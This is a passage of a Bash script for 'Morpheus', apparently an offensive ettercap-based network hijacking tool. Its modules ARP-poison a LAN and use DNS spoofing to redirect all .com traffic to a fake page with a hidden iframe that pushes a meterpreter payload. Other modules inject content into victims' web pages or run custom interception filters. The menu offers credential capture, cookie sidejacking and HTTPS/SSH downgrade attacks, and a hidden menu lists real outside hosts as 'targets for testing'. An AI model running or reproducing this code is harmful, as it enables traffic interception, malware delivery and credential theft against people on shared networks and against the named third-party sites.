echo "${BlueF}    | ${YellowF}    This module will embbeded your payload into a fake webpage    ${BlueF}|"
echo "${BlueF}    | ${YellowF}     and delivers it using mitm+dns_spoof (trigger download)      ${BlueF}|"
echo "${BlueF}    | ${YellowF}    'All [.com] domains will be redirected to the fake webpage'   ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-selection --text "chose payload to be uploded\nexample:meterpreter.exe") > /dev/null 2>&1
dIc=$(zenity --title="☠ PAYLOAD NAME ☠" --text "Enter payload to be uploaded name\nexample:meterpreter.exe" --entry --width 270) > /dev/null 2>&1


  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb # backup (NO dev/null to report file not existence)
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  # using bash SED to inject our malicious <iframe>
  cd phishing
  sed "s|<\/body>|<iframe width=\"1\" height=\"1\" frameborder=\"0\" src=\"http://$IP/$dIc\"><\/iframe><\/body>|" clone.html > clone2.html
  # copy files to apache2 webroot
  mv clone2.html $ApachE/index.html > /dev/null 2>&1
  cp miss.png $ApachE > /dev/null 2>&1
  cp $UpL $ApachE > /dev/null 2>&1
  rm clone2.html > /dev/null 2>&1
  cd ..
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
  cd $IPATH
  sleep 1


# IF NOT EXIST FILE IN APACHE, ABORT..
if ! [ -e $ApachE/$dIc ]; then
echo ${RedF}[x]${white} Backdoor:${RedF}$dIc ${white}not found...${Reset};
sleep 3
cd $ApachE
rm *.exe
rm $ApachE/miss.png > /dev/null 2>&1
cd $IPATH
sh_exit # jump to exit ...
fi

echo ${BlueF}[☠]${white} Found:${GreenF}$dIc${RedF}!${Reset};
sleep 1

# start apache2 webserver...
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  rm $ApachE/miss.png > /dev/null 2>&1
  rm $ApachE/$dIc > /dev/null 2>&1
  cd $IPATH
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# --------------------------------
# INJECT IMAGE INTO TARGET WEBSITE
# --------------------------------
sh_stage7 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This filter will substitute the html tag '<img src=>'         ${BlueF}|"
echo "${BlueF}    | ${YellowF}   and injects your image in any webpage requested by target      ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb > /dev/null 2>&1
sleep 1

  echo ${BlueF}[☠]${white} Edit img_replace.eft '(filter)'${RedF}!${Reset};
  sleep 1
 fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  sed -i "s|TaRONE|$fil_one|g" img_replace.eft # NO dev/null to report file not existence :D
  cd $IPATH
  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/img_replace.eft"
  sleep 1

    # compiling img_replace.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling img_replace.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/img_replace.eft -o $IPATH/output/img_replace.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      # HINT: irongeek nao usou UID 0 e SSL active...
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one// /$GaTe//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one// /$GaTe//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one/ /$GaTe/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one/ /$GaTe/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/img_replace.rb $IPATH/filters/img_replace.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/img_replace.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# ----------------------
# WRITE YOUR OWN FILTER
# ----------------------
sh_stageW () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module allow you to write your own filter from scratch.  ${BlueF}|"
echo "${BlueF}    | ${YellowF}  morpheus presents a 'template' previous build for you to write  ${BlueF}|"
echo "${BlueF}    | ${YellowF} your own command logic and automate the compile/lunch of filter. ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/template.eft $IPATH/filters/template.rb > /dev/null 2>&1
  sleep 1

  echo ${BlueF}[☠]${white} Edit template '(filter)'${RedF}!${Reset};
  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
  sleep 1

    # compiling template.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost/ /$gateway/
        fi
      fi
    

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/template.rb $IPATH/filters/template.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/template.ef > /dev/null 2>&1
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






# ------------------------------------------------
# NMAP FUNTION TO REPORT LIVE TARGETS IN LOCAL LAN
# ------------------------------------------------
sh_stageS () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}    This module uses nmap framework to report live hosts (LAN)    ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[☠]${white} Scanning Local Lan${RedF}! ${Reset};
  # grab ip range + scan with nmap + zenity display results
  IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
  echo ${BlueF}[☠]${white} Ip Range${RedF}:${white}$IP_RANGE${RedF}! ${Reset};
  nmap -sn $IP_RANGE | grep "for" | awk {'print $3,$5,$6'} > $IPATH/logs/lan.mop
  cat $IPATH/logs/lan.mop | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 410 --height 400 > /dev/null 2>&1

    # cleanup
    echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
    rm $IPATH/logs/lan.mop > /dev/null 2>&1
    sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}






#
# easter egg: targets to test modules.
#
sh_stageT () {
echo ""
echo "${white}    Available targets For testing [HTTP] "
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    |  ${YellowF}http://predragtasevski.com${BlueF}                                       |"
echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com${BlueF}                                     |"
echo "${BlueF}    |  ${YellowF}http://178.21.117.152/phpmyadmin/${BlueF}                                |"
echo "${BlueF}    |  ${YellowF}http://malwareforensics1.blogspot.pt${BlueF}                             |"
echo "${BlueF}    |  ${YellowF}http://www.portugalpesca.com/forum/login.php${BlueF}                     |"
echo "${BlueF}    |  ${YellowF}telnet 216.58.214.174 [TELNET]${BlueF}                                   |"
echo "${BlueF}    |  ${YellowF}telnet 192.168.1.254  [TELNET]${BlueF}                                   |"
echo "${BlueF}    |  ${YellowF}ftp 192.168.1.254     [FTP]${BlueF}                                      |"
echo "${BlueF}    |  ${YellowF}ssh 192.168.1.254     [SSH]${BlueF}                                      |"
echo "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
sleep 1
echo "${BlueF}    ╘ ${white}Press [${GreenF}ENTER${white}] to 'return' to main menu${RedF}!"
read OP
}





#
# help in scripting ;)
#
sh_help () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}Please read my GitHub docummentation for further understandind... ${BlueF}|"
echo "${BlueF}    ╠───────────────────────────────────────────────────────────────────╝"
echo "${BlueF}    ╘ ${white}Please wait, open webbrowser."
sleep 3
xdg-open "https://github.com/r00t-3xp10it/morpheus/issues"
}





# -------------------------
# FUNTION TO EXIT FRAMEWORK
# -------------------------
sh_exit () {
echo ${BlueF}[☠]${white} Exit morpheus${RedF}:${white}[ $cnm ] ${Reset};
sleep 1
echo ${BlueF}[☠]${white} Revert ettercap etter.conf ${GreenF}✔${white} ${Reset};
mv /tmp/etter.conf $Econ > /dev/null 2>&1
mv /tmp/etter.dns $Edns > /dev/null 2>&1
sleep 2
clear
exit
}




Colors;
# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
# Loop forever
while :
do
clear
echo "" && echo "${BlueF}                 ☆ 𝓪𝓾𝓽𝓸𝓶 𝓪𝓽𝓮𝓭 𝓮𝓽𝓽𝓮𝓻𝓬𝓪𝓹 𝓽𝓬𝓹/𝓲𝓹 𝓱𝓲𝓳𝓪𝓬𝓴𝓲𝓷𝓰 𝓽𝓸𝓸𝓵 ☆${BlueF}"
cat << !
    ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
    ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
    ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
!
echo ${BlueF}"    VERSION:${YellowF}$V3R${BlueF} DISTRO:${YellowF}$DiStR0${BlueF} IP:${YellowF}$IP${BlueF} INTERFACE:${YellowF}$InT3R${BlueF} IPv6:${YellowF}$IpV"${BlueF}
cat << !
    ╔────────╦──────────────────────────────────────────────────────────╗
    | OPTION |                 DESCRIPTION(filters)               v:$V3R |
    ╠────────╩──────────────────────────────────────────────────────────╣
    |   1    -  Firewall filter tcp/udp          [report/capture_creds] |
    |   2    -  Sidejacking (http)               [capture auth cookie ] |
    |   3    -  Drop all packets from/to         [ packets drop,kill  ] |
    |   4    -  Redirect browser traffic         [ to another domain  ] |
    |   5    -  Redirect browser traffic         [ to google sphere   ] |
    |   6    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
    |   7    -  Replace website images           [ img src=http://www ] |
    |   8    -  Replace website text             [ replace: worlds    ] |
    |   9    -  Rotate website document 180º     [ CSS3 injection     ] |
    |  10    -  https downgrade attack demo      [ replace: https     ] |
    |  11    -  ssh downgrade attack demo        [ replace: SSH-1.99  ] |
    |                                                                   |
    |   W    -  Write your own filter            [ use morpheus tool  ] |
    |   S    -  Scan LAN for live hosts          [ use nmap framework ] |
    |   E    -  Exit/close Morpheus              [ safelly close tasks] |
    ╚───────────────────────────────────────────────────────────────────╣
!
echo "${YellowF}                                                       SSA_${RedF}RedTeam${YellowF}©2016${BlueF}_⌋${Reset}"
echo ${BlueF}[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
sleep 1
echo ${BlueF}[➽]${white} Chose Your Option[filter]${RedF}: ${Reset};
echo -n "$PrompT"
read choice
case $choice in
1) sh_stage1 ;;
2) sh_stage2 ;;
3) sh_stage3 ;;
4) sh_stage4 ;;
10) sh_stage10 ;;
11) sh_stage11 ;;
W) sh_stageW ;;
w) sh_stageW ;;
S) sh_stageS ;;
s) sh_stageS ;;
-h) sh_help ;;
help) sh_help ;;
--help) sh_help ;;
targets) sh_stageT ;;
e) sh_exit ;;
E) sh_exit ;;
*) echo "\"$choice\": is not a valid Option"; sleep 1 ;;
esac
done

